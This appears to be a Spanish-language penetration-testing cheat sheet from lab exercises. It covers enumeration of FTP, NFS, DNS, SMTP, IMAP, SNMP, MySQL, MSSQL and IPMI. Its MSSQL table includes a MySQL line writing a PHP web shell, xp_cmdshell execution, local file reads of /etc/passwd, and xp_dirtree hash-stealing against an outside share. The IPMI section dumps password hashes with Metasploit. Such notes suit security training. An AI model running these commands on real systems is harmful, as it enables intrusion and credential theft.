---
title: Shells
date: 2022-07-31 13:25:30 +/-TTTT
categories: [UTILITIES, Shells]
tags: [shells]     # TAG names should always be lowercase
---

```console
export TERM=xterm-256color
```
{: .nolineno }



| Web Server                   | Default Webroot   |
|:-----------------------------|:-----------------|
| Apache| /var/www/html/  
| Nginx | /usr/local/nginx/html/  
| IIS   | c:\inetpub\wwwroot\ 
| XAMPS | C:\xampp\htdocs\

## FTP

Cuanto tengamos le puerto 2121 abierto, podemos descargarnos toda la información que tenga con wget

```shell
wget -m --user=ceil --password=qwer1234 ftp://10.129.42.195:2121
```

## NFS Y MOUNTS

```console
showmounts -e 10.10.10.10  
mount -t nfs 10.10.10.10:/ ./nombredecarpeta/ -o nolock 
```
Opciones Peligrosas

|Option 	|Description|
|:--------------|:----------|
|rw      	|Read and write permissions.|
|insecure 	|Ports above 1024 will be used.|
|nohide 	|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|root_squash 	|Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous.|


## DNS

Cuando la opción `allowtransfer` está habilitada, podemos hacer un ataque de transferencia de zona, para eso podemos usar dig o dnsenum para aplicar fuerza bruta indicando un diccionario.

```console
dig axfr internal.inlanefreight.htb @10.129.14.128
dnsenum --dnsserver 10.129.29.0 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/Seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
```

Opciones Peligrosas

|Option 	|Description|
|:--------------|:----------|
|allow-query 	|Defines which hosts are allowed to send requests to the DNS server.|
|allow-recursion 	|Defines which hosts are allowed to send recursive requests to the DNS server.|
|allow-transfer 	|Defines which hosts are allowed to receive zone transfers from the DNS server.|
|zone-statistics 	|Collects statistical data of zones.|

## SMTP

Podemos enumerar SMTP con nmap aplicando el script para validar los comandos que podemos usar.
Igualmente se puede usar `telnet` con acceso, podemos enumerar la versión y servicio

```console
sudo nmap -sC -sV -p25 -Pn 10.129.29.0
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 20:49 CDT
Nmap scan report for inlanefreight.htb (10.129.29.0)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
Service Info: Host: InFreight


telnet 10.129.25.224 25
Trying 10.129.25.224...
Connected to 10.129.25.224.
Escape character is '^]'.
EHLO
220 InFreight ESMTP v2.11
501 Syntax: EHLO hostname

```
## IMAP / POP3

Configuraciones peligrosas

|Ajuste|	Descripción|
|:-----|:-----------------|
|auth_debug|	Habilita todo el registro de depuración de autenticación.|
|auth_debug_passwords|	Esta configuración ajusta el nivel de detalle del registro, las contraseñas enviadas y el esquema se registra.|
|auth_verbose|	Registra los intentos de autenticación fallidos y sus motivos.|
|auth_verbose_passwords|	Las contraseñas utilizadas para la autenticación se registran y también se pueden truncar.|
|auth_anonymous_username|	Esto especifica el nombre de usuario que se utilizará al iniciar sesión con el mecanismo ANONYMOUS SASL.|

Podemos enumerar información por medio de curl

```console
curl -k "imaps://10.10.10.10" --user robin:robin -v
```

Podemos conectarnos mediante openssl, netcat o telnet

```console
openssl s_client --connect 10.10.10.10:imaps
openssl s_client --connect 10.10.10.10:pop3s
```

Aquí podemos ver los comando que podríamos utilizar para revisar correos
https://www.atmail.com/blog/imap-commands/

## SNMP

Con `snmpwalk`, `onesixtyone` y `braa` podemos obtener información del protocolo snmp

```console
snmpwalk -v2c -c public 10.129.42.195
onesixtyone -c /usr/share/Seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.192.228
braa public@10.129.42.195:.1.* 
```
## MYSQL

TCP port 3306

Configuraciones peligrosas

|Settings	|Description|
|:--------------|:---------|
|user	|Sets which user the MySQL service will run as.|
|password	|Sets the password for the MySQL user.|
|admin_address	|The IP address on which to listen for TCP/IP connections on the administrative network interface.|
|debug	|This variable indicates the current debugging settings|
|sql_warnings	|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
|secure_file_priv	|This variable is used to limit the effect of data import and export operations.|

```shell
systemctl start mysql
mysql -u robin -h 10.129.105.253 -p
```
## MSSQL

TCP port 1433

```shell
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433
mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
```shell
mssqlclient.py  ILF-SQL-01/backdoor:Password1@10.129.201.248 -windows-auth
SQL> select name from sys.databases
name                         
```

|-|-|
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.  |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux.  |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
| `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL.  |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges |


## IPMI

UDP port 623

```shell
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

DEFAULT PASSWORDS

|Product	|Username	|Password|
|:--------------|:--------------|:-------|
|Dell iDRAC	|root	|calvin|
|HP iLO	|Administrator	|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI	|ADMIN	|ADMIN|

Con metasploit podemos dumpear los hashes que usa IPMI para autenticarse

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f90
80f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
O podemos la herramienta de ipmipwner.py

```shell
sudo python3 ipmipwner.py --host 10.129.202.5
[*] Checking if port 623 for host 10.129.202.5 is active
[*] Using the list of users that the script has by default
[*] Brute Forcing
[*] Number of retries: 2
[*] The username: admin is valid                                                                                            
[*] The hash for user: admin
   \_ $rakp$a4a3a2a082000000f474fecc003346fcdd2cb273f25c5f22db3b9bc7a73d9a0b1fbf242bd11d7c1aa123456789abcdefa123456789abcdef140561646d696e$b613971c59b7260665fdc31bc047584c39225876
```
